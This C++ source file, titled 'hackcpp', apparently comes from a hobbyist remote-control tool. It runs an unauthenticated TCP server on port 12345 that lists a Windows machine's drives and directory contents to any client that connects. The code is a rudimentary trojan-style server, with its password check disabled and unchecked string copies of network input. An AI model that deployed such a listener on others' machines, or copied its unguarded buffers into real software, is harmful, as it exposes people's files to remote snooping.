// hackcpp.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "hackcpp.h"
#include<winsock.h>    //记得加入头文件

#pragma comment(lib,"ws2_32")  //库函数

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
//定义函数接收来自客户端请求查找磁盘的信息
WORD WINAPI SLisen(LPVOID lparam);


#include"SYS.h"

typedef struct
{
	int ID;
	BYTE lparam[2048];
}COMMAND;

typedef struct
{
	char FileName[MAX_PATH];
	int FileLen;
	char Time[50];
	BOOL IsDir;
	BOOL Error;
	HICON hIcon;
}FILEINFO;

DWORD WINAPI GetDriveProc(COMMAND command,SOCKET socket);
DWORD WINAPI GetDriInfoProc(COMMAND command,SOCKET socket);
// 唯一的应用程序对象

CWinApp theApp;

using namespace std;

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	/*int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// 初始化 MFC 并在失败时显示错误
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: 更改错误代码以符合您的需要
			_tprintf(_T("错误: MFC 初始化失败\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: 在此处为应用程序的行为编写代码。
			_tprintf(_T(" MFC "));
		}
	}
	else
	{
		// TODO: 更改错误代码以符合您的需要
		_tprintf(_T("错误: GetModuleHandle 失败\n"));
		nRetCode = 1;
	}

	return nRetCode;*/

	//初始化版本
	WSADATA wsadata;
	WORD ver= MAKEWORD(2,2);
	WSAStartup(ver,&wsadata);

	//创建套接字
	SOCKET server;
	server=socket(AF_INET ,SOCK_STREAM,0);
	SOCKADDR_IN serveraddr;
	serveraddr .sin_family=AF_INET;
	serveraddr.sin_port=htons(12345);//端口
	serveraddr.sin_addr.S_un.S_addr=htonl(INADDR_ANY);  //主机字节变为网络字节
	//绑定
	bind(server,(SOCKADDR*)&serveraddr,sizeof(serveraddr));
	//监听
	listen(server,10);
	
	SOCKET client;

	while(true)
	{
		//接收
		client=accept(server,0,0);
		/*if(client=accept(server,0,0)!=INVALID_SOCKET )
		{
			char buff[20];
			if(send(client,"kjinziguiteer",sizeof("kjinziguiteer"),0)!=SOCKET_ERROR )
			{
				cout<<"等待客户端输入密码"<<endl;
			}
		}*/

		CreateThread (NULL,0,(LPTHREAD_START_ROUTINE)SLisen ,(LPVOID)client,0,NULL);

	}
	closesocket (server);
	closesocket(client);
	return 0;
}


WORD WINAPI SLisen(LPVOID lparam)
{
	SOCKET client ;
	client=(SOCKET)lparam;
	COMMAND command;
	while(true)
	{
		memset((char*)&command,0,sizeof(command));
		if(recv(client,(char*)&command,sizeof(command),0)==SOCKET_ERROR)
		{
			cout<<"接收客户端指令有错误！"<<endl;
			break;
		}
		else
		{
			switch (command.ID)
			{
			case GetDriver:
				cout<<"收到请求磁盘信息"<<endl;
				GetDriveProc (command,client);
				break;
			case GetDriInfo:
				cout<<"收到请求文件夹和文件的信息"<<endl;
				GetDriInfoProc(command,client);
				break;

			}
		}
	}
	closesocket (client);
	return 0;
	 
}


DWORD WINAPI GetDriveProc (COMMAND command,SOCKET client)
{
	COMMAND cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID =GetDriver ;
	for(char i='A';i<='H';i++)
	{
		char x[7]={i,':','\0'};
		UINT type=GetDriveType(x);//得到磁盘的信息
		if(type==DRIVE_FIXED  || type==DRIVE_REMOVABLE || type==DRIVE_CDROM )
		{
			memset ((char*)cmd.lparam ,0,sizeof(cmd.lparam ));   //lparam本身是个指针，所以不用引用
			strcpy((char*)cmd.lparam ,x);
			if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR )     //将获得的信息发送给客户端,fuck,将发送cmd信息写成了client弄了好久没有显示磁盘信息
			{
				cout<<" 给客户端反馈磁盘信息失败！"<<endl;
			}
			else
			{
				cout<<"给客户端反馈磁盘信息成功!"<<endl;
			}
		}
	}
	return 0;
}

DWORD WINAPI GetDriInfoProc(COMMAND command,SOCKET client)
{
	FILEINFO fi;
	COMMAND cmd;
	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));
	strcat((char*)command.lparam,"*.*");     //查看某盘下所有的文件夹和文件
	CFileFind file;
	BOOL bContinue;
	bContinue=file.FindFile ((char*)command.lparam ,0);
	while(bContinue)
	{
		memset((char*)&fi,0,sizeof(fi));
		memset((char*)&cmd,0,sizeof(cmd));
		bContinue=file.FindNextFile();
		if(file.IsDirectory())
		{
			fi.IsDir=true;
		}
		strcpy(fi.FileName ,file.GetFileName ().LockBuffer ());
		cmd.ID=GetDriInfo;
		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));   //绑定信息
		if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR )     //将获得的信息发送给客户端,fuck,将发送cmd信息写成了client弄了好久没有显示磁盘信息
		{
			cout<<" 给客户端发送文件夹和文件信息失败！"<<endl;
		}
		else
		{
			cout<<"给客户端发送文件夹和文件信息成功!"<<endl;
		}
	}
	return 0;
}